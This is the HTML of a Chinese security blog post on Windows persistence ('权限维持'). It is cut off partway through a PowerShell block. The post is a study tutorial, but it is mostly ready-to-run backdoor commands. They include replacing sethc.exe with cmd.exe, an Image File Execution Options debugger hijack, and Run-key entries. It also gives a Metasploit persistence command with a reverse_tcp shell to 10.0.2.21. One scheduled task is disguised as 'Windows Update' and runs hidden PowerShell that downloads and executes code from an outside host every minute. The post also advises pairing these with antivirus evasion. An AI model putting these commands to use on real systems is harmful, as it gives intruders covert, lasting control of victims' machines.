@@ -1,0 +1,615 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="reader-l">
+  <meta name="keywords" content="reader-l&#39;s blog">
+  <title>内网安全学习五-权限维持 - reader-l&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"reader-l.github.io","root":"/","version":"1.8.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.3.0"><link rel="alternate" href="/atom.xml" title="reader-l's blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>reader-l's blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/Links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/List/">
+                <i class="iconfont icon-link-fill"></i>
+                List
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="内网安全学习五-权限维持">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-04-14 19:06" pubdate>
+        2021年4月14日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      2.3k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      29
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">内网安全学习五-权限维持</h1>
+            
+              <p class="note note-info">
+                
+                  本文最后更新于：2021年4月28日 晚上
+                
+              </p>
+            
+            <div class="markdown-body">
+              <h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h1><p>后门（backdoor），在信息安全领域通常是指绕过安全措施获取对程序或系统访问权限的方法。攻击者往往在提升权之后，会通过建立后门来维持对目标主机的控制权。这样一来，即使修复了被攻击者利用的系统漏洞，攻击者还是可以利用后门继续控制目标系统。</p>
+<h1 id="2-操作系统后门"><a href="#2-操作系统后门" class="headerlink" title="2.操作系统后门"></a>2.操作系统后门</h1><p>​    操作系统后门，泛指绕过目标系统安全控制体系的正规用户认证来维持对目标系统的控制及隐匿控制行为的方法。</p>
+<h2 id="1-粘滞键后门"><a href="#1-粘滞键后门" class="headerlink" title="1.粘滞键后门"></a>1.粘滞键后门</h2><p>​    该后门已经流传很久了，操作简单可利用性高。</p>
+<p>​    在正常情况下，我们只要在Windows主机上连续按5此<code>Shift</code>键，就可以调用出粘滞键，实际上是调用<code>windows\system32\sethc.exe</code></p>
+<p>​    而攻击者可以将<code>cmd.exe</code>可执行文件去替换<code>sethc.exe</code>，之后连续按5次<code>Shift</code>键，就会弹出命令行窗口。</p>
+<p><img src="/2021/04/14/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%94-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/1.png" srcset="/img/loading.gif"></p>
+<h3 id="1-第一种方法（适用于Windows-Vista版本之前的系统）"><a href="#1-第一种方法（适用于Windows-Vista版本之前的系统）" class="headerlink" title="1.第一种方法（适用于Windows  Vista版本之前的系统）"></a>1.第一种方法（适用于Windows  Vista版本之前的系统）</h3><p>具体命令如下：</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">cd</span> C:\Windows\System32<br>Move sethc.<span class="hljs-keyword">exe</span> sethc.<span class="hljs-keyword">exe</span>.bak<br>Copy cmd.<span class="hljs-keyword">exe</span> sethc.<span class="hljs-keyword">exe</span><br></code></pre></td></tr></table></figure>
+<h3 id="2-第二种方法（适用于Windows-Vista版本之后的系统）"><a href="#2-第二种方法（适用于Windows-Vista版本之后的系统）" class="headerlink" title="2.第二种方法（适用于Windows Vista版本之后的系统）"></a>2.第二种方法（适用于Windows Vista版本之后的系统）</h3><p>​    在Windows Vista版本之后的系统，如果使用administrator权限进行修改的话，就会出现如下问题。</p>
+<p><img src="/2021/04/14/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%94-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/2.png" srcset="/img/loading.gif"></p>
+<p>​    因此我们需要对该可执行文件的所有者权限进行修改。</p>
+<p><img src="/2021/04/14/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%94-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/3.png" srcset="/img/loading.gif"></p>
+<p>​    所有者权限进行修改完成后，我们再修改用户对该可执行文件的权限。</p>
+<p><img src="/2021/04/14/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%94-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/4.png" srcset="/img/loading.gif"></p>
+<p>​    以上操作完成后，最后再执行将<code>cmd.exe</code>去替换<code>sethc.exe</code>的操作。</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">cd</span> C:\Windows\System32<br>Move sethc.<span class="hljs-keyword">exe</span> sethc.<span class="hljs-keyword">exe</span>.bak<br>Copy cmd.<span class="hljs-keyword">exe</span> sethc.<span class="hljs-keyword">exe</span><br></code></pre></td></tr></table></figure>
+<p> 之后我们只要按5次粘滞键就可以打开cmd.exe了。</p>
+<p><img src="/2021/04/14/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%94-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/5.png" srcset="/img/loading.gif"></p>
+<h3 id="3-第三种方法（通过修改注册表项）"><a href="#3-第三种方法（通过修改注册表项）" class="headerlink" title="3.第三种方法（通过修改注册表项）"></a>3.第三种方法（通过修改注册表项）</h3><p>​    通过该方法我们并未修改<code>cmd.exe</code>的命名。该技术的核心为修改注册表的映像劫持。</p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">REG ADD &quot;HKLM<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows NT<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\I</span>mage File Execution Options<span class="hljs-symbol">\s</span>ethc.exe&quot; /v Debugger /t REG_SZ /d &quot;C:<span class="hljs-symbol">\w</span>indows<span class="hljs-symbol">\s</span>ystem32<span class="hljs-symbol">\c</span>md.exe&quot;<br></code></pre></td></tr></table></figure>
+<blockquote>
+<p>reg add 是向注册表添加记录，后面跟的是注册表的位置，这里需要注意的是 HKLM 实际上是HKEY_LOCAL_MACHINE 的缩写。Image File Execution Option 这个目录就是用来设置镜像劫持的，要被劫持的就是命令中的 sethc 粘滞键程序，随后通过 / v 来指定键名，这个键名 debugger 是固定的，然后通过 / t 来指定类型，即 REG_SZ 字符串类型，最后通过 / d 来指定键的值，即被恶意替换的程序，也就是我们的 cmd。</p>
+</blockquote>
+<p>操作成功。</p>
+<p><img src="/2021/04/14/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%94-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/6.png" srcset="/img/loading.gif"></p>
+<p>成功弹出cmd.exe</p>
+<p><img src="/2021/04/14/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%94-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/7.png" srcset="/img/loading.gif"></p>
+<p>一般都是system权限。</p>
+<p><img src="/2021/04/14/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%94-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/8.png" srcset="/img/loading.gif"></p>
+<h3 id="4-解决方法"><a href="#4-解决方法" class="headerlink" title="4.解决方法"></a>4.解决方法</h3><p>1.在远程登录服务器时，连续按5此<code>Shift</code>键，判断服务器是否被入侵。</p>
+<p>2.拒绝使用<code>sethc.exe</code>或者在”控制面板”中关闭”启用粘滞键”选项。</p>
+<h2 id="2-注册表注入后门"><a href="#2-注册表注入后门" class="headerlink" title="2.注册表注入后门"></a>2.注册表注入后门</h2><h3 id="1-利用当前用户的运行键"><a href="#1-利用当前用户的运行键" class="headerlink" title="1.利用当前用户的运行键"></a>1.利用当前用户的运行键</h3><p>命令如下：</p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">reg add &quot;HKEY_CURRENT_USER<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\R</span>un&quot; /v Pentestlab /t REG_SZ /d &quot;C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\p</span>entestlab<span class="hljs-symbol">\p</span>entestlab.exe&quot;<br>reg add &quot;HKEY_CURRENT_USER<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\R</span>unOnce&quot; /v Pentestlab /t REG_SZ /d &quot;C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\p</span>entestlab<span class="hljs-symbol">\p</span>entestlab.exe&quot;<br>reg add &quot;HKEY_CURRENT_USER<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\R</span>unServices&quot; /v Pentestlab /t REG_SZ /d &quot;C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\p</span>entestlab<span class="hljs-symbol">\p</span>entestlab.exe&quot;<br>reg add &quot;HKEY_CURRENT_USER<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\R</span>unServicesOnce&quot; /v Pentestlab /t REG_SZ /d &quot;C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\p</span>entestlab<span class="hljs-symbol">\p</span>entestlab.exe&quot;<br></code></pre></td></tr></table></figure>
+<p>该注册表操作语句会在目标主机的启动项里增加一个命名。当目标主机登录系统时，后门就会运行。</p>
+<h3 id="2-利用本地计算机的注册表位置"><a href="#2-利用本地计算机的注册表位置" class="headerlink" title="2.利用本地计算机的注册表位置"></a>2.利用本地计算机的注册表位置</h3><p>​    如果攻击者所获得的权限提升了，则最好使用本地计算机注册表的位置，而不是以上的<code>CURRENT_USER</code>的键，因为有效负载将在每次系统启动时执行，而与使用系统身份验证的用户无关，这样就可以实现所有用户的持久化。</p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">reg add &quot;HKEY_LOCAL_MACHINE<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\R</span>un&quot; /v Pentestlab /t REG_SZ /d &quot;C:<span class="hljs-symbol">\t</span>mp<span class="hljs-symbol">\p</span>entestlab.exe&quot;<br>reg add &quot;HKEY_LOCAL_MACHINE<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\R</span>unOnce&quot; /v Pentestlab /t REG_SZ /d &quot;C:<span class="hljs-symbol">\t</span>mp<span class="hljs-symbol">\p</span>entestlab.exe&quot;<br>reg add &quot;HKEY_LOCAL_MACHINE<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\R</span>unServices&quot; /v Pentestlab /t REG_SZ /d &quot;C:<span class="hljs-symbol">\t</span>mp<span class="hljs-symbol">\p</span>entestlab.exe&quot;<br>reg add &quot;HKEY_LOCAL_MACHINE<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\R</span>unServicesOnce&quot; /v Pentestlab /t REG_SZ /d &quot;C:<span class="hljs-symbol">\t</span>mp<span class="hljs-symbol">\p</span>entestlab.exe&quot;<br></code></pre></td></tr></table></figure>
+<h3 id="3-LOCAL-CHINE键的特殊位置"><a href="#3-LOCAL-CHINE键的特殊位置" class="headerlink" title="3.LOCAL_CHINE键的特殊位置"></a>3.LOCAL_CHINE键的特殊位置</h3><p>还有两个注册表位置，这些位置可以允许红队通过执行任意有效负载或DLL来实现持久性。这些将在登录期间执行，<strong>并且需要管理员级别的特权</strong>。</p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">reg add &quot;HKEY_LOCAL_MACHINE<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\R</span>unOnceEx<span class="hljs-symbol">\0</span>001&quot; /v Pentestlab /t REG_SZ /d &quot;C:<span class="hljs-symbol">\t</span>mp<span class="hljs-symbol">\p</span>entestlab.exe&quot;<br>reg add &quot;HKEY_LOCAL_MACHINE<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\R</span>unOnceEx<span class="hljs-symbol">\0</span>001<span class="hljs-symbol">\D</span>epend&quot; /v Pentestlab /t REG_SZ /d &quot;C:<span class="hljs-symbol">\t</span>mp<span class="hljs-symbol">\p</span>entestlab.dll&quot;<br></code></pre></td></tr></table></figure>
+<h3 id="4-MSF也有相关-的模块可以使用"><a href="#4-MSF也有相关-的模块可以使用" class="headerlink" title="4.MSF也有相关 的模块可以使用"></a>4.MSF也有相关 的模块可以使用</h3><p>​    <code>Metasploit Framework</code>通过使用<code>Meterpreter</code>脚本和后期利用模块来支持通过注册表的持久性。<code>Meterpreter</code>脚本将以<code>VBS</code>脚本的形式创建一个有效负载，该负载将被拖放到磁盘上，并将创建一个注册表项，该注册表项将在用户登录期间运行该有效负载。</p>
+<p>​    当我们拿到Meterpreter会话的时候，我们可以直接利用Meterpreter的一个模块<code>persistence</code>。</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">run</span> persistence -U -P windows/x<span class="hljs-number">64</span>/meterpreter/reverse_tcp -i <span class="hljs-number">5</span> -p <span class="hljs-number">443</span> -r <span class="hljs-number">10.0.2.21</span><br></code></pre></td></tr></table></figure>
+<p>​    （<strong>非常推荐用该方法，因为用该方法就可以使用自己免杀的程序了</strong>）MSF还有一个后期开发模块，可用于持久性。该模块需要以下配置，并将可执行文件放置在受感染系统上的可写位置。</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros">use post/windows/manage/persistence_exe<br><span class="hljs-builtin-name">set</span> REXEPATH /tmp/pentestlab.exe<br><span class="hljs-builtin-name">set</span> SESSION 2<br><span class="hljs-builtin-name">set</span> STARTUP USER<br><span class="hljs-builtin-name">set</span> LOCALEXEPATH C:\\tmp<br>run<br></code></pre></td></tr></table></figure>
+<h2 id="3-计划任务后门"><a href="#3-计划任务后门" class="headerlink" title="3.计划任务后门"></a>3.计划任务后门</h2><p>​    计划任务后门分为管理员权限和普通用户权限两种。管理员权限的后门可以设置更多的计划任务，例如重启后运行等。</p>
+<h3 id="1-使用at命令调用（windows-7及其之前的版本的操作系统可以使用）"><a href="#1-使用at命令调用（windows-7及其之前的版本的操作系统可以使用）" class="headerlink" title="1.使用at命令调用（windows 7及其之前的版本的操作系统可以使用）"></a>1.使用at命令调用（windows 7及其之前的版本的操作系统可以使用）</h3><p>每天<code>22：26</code>时都执行<code>cmd.exe</code>可执行文件。</p>
+<p><img src="/2021/04/14/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%94-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/9.png" srcset="/img/loading.gif"></p>
+<h3 id="2-使用schtasks命令调用后门（从windows-8版本之后的开始是使用该命令进行计划任务的）"><a href="#2-使用schtasks命令调用后门（从windows-8版本之后的开始是使用该命令进行计划任务的）" class="headerlink" title="2.使用schtasks命令调用后门（从windows 8版本之后的开始是使用该命令进行计划任务的）"></a>2.使用schtasks命令调用后门（从windows 8版本之后的开始是使用该命令进行计划任务的）</h3><p>​    该命令表示每一个小时执行<code>notepad.exe</code>。</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">schtasks <span class="hljs-string">/CREATE</span> <span class="hljs-string">/TN</span> UPDATER <span class="hljs-string">/TR</span> C:\Windows\System32\notepad.exe <span class="hljs-string">/SC</span> HOURLY <span class="hljs-string">/MO</span> 1<br></code></pre></td></tr></table></figure>
+<p><img src="/2021/04/14/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%BA%94-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/10.png" srcset="/img/loading.gif"></p>
+<p>​    如果用MSF或者Empire其它工具来建立计划任务进行反弹shell等恶意操作的话，现在已经常常受到安全防护软件的查杀了。</p>
+<p>​    因此想利用好该方法，还得使用免杀技术。</p>
+<p>​    免杀程序可以看看我的一些免杀的文章。</p>
+<h4 id="设定在系统启动期间或者用户会话处于非活动状态（空闲模式）时执行。"><a href="#设定在系统启动期间或者用户会话处于非活动状态（空闲模式）时执行。" class="headerlink" title="设定在系统启动期间或者用户会话处于非活动状态（空闲模式）时执行。"></a>设定在系统启动期间或者用户会话处于非活动状态（空闲模式）时执行。</h4><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-comment">#(X64) - On System Start</span><br>schtasks <span class="hljs-string">/create</span> <span class="hljs-string">/tn</span> PentestLab <span class="hljs-string">/tr</span> <span class="hljs-string">&quot;你要执行的命令或文件&quot;</span> <span class="hljs-string">/sc</span> onstart <span class="hljs-string">/ru</span> System<br><br><span class="hljs-comment">#(X64) - On User Idle (30mins)</span><br>schtasks <span class="hljs-string">/create</span> <span class="hljs-string">/tn</span> PentestLab <span class="hljs-string">/tr</span> <span class="hljs-string">&quot;&quot;</span> <span class="hljs-string">/sc</span> onidle <span class="hljs-string">/i</span> 30<br><br><span class="hljs-comment">#(X86) - On User Login</span><br>schtasks <span class="hljs-string">/create</span> <span class="hljs-string">/tn</span> PentestLab <span class="hljs-string">/tr</span> <span class="hljs-string">&quot;&quot;</span> <span class="hljs-string">/sc</span> onlogon <span class="hljs-string">/ru</span> System<br><br><span class="hljs-comment">#(X86) - On System Start</span><br>schtasks <span class="hljs-string">/create</span> <span class="hljs-string">/tn</span> PentestLab <span class="hljs-string">/tr</span> <span class="hljs-string">&quot;&quot;</span> <span class="hljs-string">/sc</span> onstart <span class="hljs-string">/ru</span> System<br><br><span class="hljs-comment">#(X86) - On User Idle (30mins)</span><br>schtasks <span class="hljs-string">/create</span> <span class="hljs-string">/tn</span> PentestLab <span class="hljs-string">/tr</span> <span class="hljs-string">&quot;&quot;</span> <span class="hljs-string">/sc</span> onidle <span class="hljs-string">/i</span> 30<br></code></pre></td></tr></table></figure>
+<h4 id="设定在特定时间发生"><a href="#设定在特定时间发生" class="headerlink" title="设定在特定时间发生"></a>设定在特定时间发生</h4><p>效负载的执行也可以在特定的时间发生，并且可以具有到期日期和自删除功能。“schtasks”实用程序提供了必要的选项，因为它是其功能的一部分。</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">schtasks <span class="hljs-string">/CREATE</span> <span class="hljs-string">/TN</span> <span class="hljs-string">&quot;Windows Update&quot;</span> <span class="hljs-string">/TR</span> <span class="hljs-string">&quot;c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c &#x27;IEX ((new-object net.webclient).downloadstring(&#x27;&#x27;http://10.0.2.21:8080/REEEE&#x27;&#x27;&#x27;))&#x27;&quot;</span> <span class="hljs-string">/SC</span> minute <span class="hljs-string">/MO</span> 1 <span class="hljs-string">/ED</span> 04/11/2019 <span class="hljs-string">/ET</span> 06<span class="hljs-function">:53</span> <span class="hljs-string">/Z</span> <span class="hljs-string">/IT</span> <span class="hljs-string">/RU</span> %USERNAME%<br><br></code></pre></td></tr></table></figure>
+<h3 id="3-使用PowerShell创建定时任务"><a href="#3-使用PowerShell创建定时任务" class="headerlink" title="3.使用PowerShell创建定时任务"></a>3.使用PowerShell创建定时任务</h3><p>可以使用PowerShell创建计划任务，这些任务将在用户登录时或在特定时间和日期执行。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$A</span> = <span class="hljs-built_in">New-ScheduledTaskAction</span> <span class="hljs-literal">-Execute</span> <span class="hljs-string">&quot;cmd.exe&quot;</span> <span class="hljs-literal">-Argument</span> <span class="hljs-string">&quot;/c C:\temp\pentestlab.exe&quot;</span><br><span class="hljs-variable">$T</span> = <span class="hljs-built_in">New-ScheduledTaskTrigger</span> <span class="hljs-literal">-AtLogOn</span> <span class="hljs-literal">-User</span> <span class="hljs-string">&quot;pentestlab&quot;</span><br><span class="hljs-variable">$S</span> = <span class="hljs-built_in">New-ScheduledTaskSettingsSet</span><br><span class="hljs-variable">$P</span> = <span class="hljs-built_in">New-ScheduledTaskPrincipal</span> <span class="hljs-string">&quot;Pentestlab&quot;</span><br><span class="hljs-variable">$D</span> = <span class="hljs-built_in">New-ScheduledTask</span> <span class="hljs-literal">-Action</span> <span class="hljs-variable">$A</span> <span class="hljs-literal">-Trigger</span> <span class="hljs-variable">$T</span> <span class="hljs-literal">-Principal</span> <span class="hljs-variable">$P</span> <span class="hljs-literal">-Settings</span> <span class="hljs-variable">$S</span><br><span class="hljs-built_in">Register-ScheduledTask</span> Pentestlab <span class="hljs-literal">-InputObjec</span> <span class="hljs-variable">$D</span><br><br><span class="hljs-variable">$A</span> = <span class="hljs-built_in">New-ScheduledTaskAction</span> <span class="hljs-literal">-Execute</span> <span class="hljs-string">&quot;cmd.exe&quot;</span> <span class="hljs-literal">-Argument</span> <span class="hljs-string">&quot;/c C:\temp\pentestlab.exe&quot;</span><br><span class="hljs-variable">$T</span> = <span class="hljs-built_in">New-ScheduledTaskTrigger</span> <span class="hljs-literal">-Daily</span> <span class="hljs-literal">-At</span> <span class="hljs-number">9</span>am<br><span class="hljs-variable">$P</span> = <span 